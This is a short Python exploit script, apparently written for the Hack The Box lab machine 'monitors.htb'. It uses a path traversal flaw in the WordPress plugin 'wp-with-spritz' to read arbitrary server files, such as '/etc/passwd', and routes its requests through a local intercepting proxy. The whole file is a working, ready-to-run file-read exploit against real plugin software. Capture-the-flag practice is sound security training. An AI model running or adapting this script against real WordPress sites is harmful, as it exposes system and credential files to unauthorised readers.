#!/usr/bin/python3
import requests
import sys
import urllib3

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1'}

def remote_file_read(file):
    url = "http://monitors.htb"
    path = "/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../"
    r = requests.get(url + path + file, proxies=proxies)
    return r.text



if __name__ == "__main__":
    try:
        file = sys.argv[1].strip()
        #file = "/etc/passwd"  # zum testen
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <file>")
        print(f"[-] Example: {sys.argv[0]} '/etc/passwd'")
        sys.exit(-1)

    res = remote_file_read(file)
    print(res)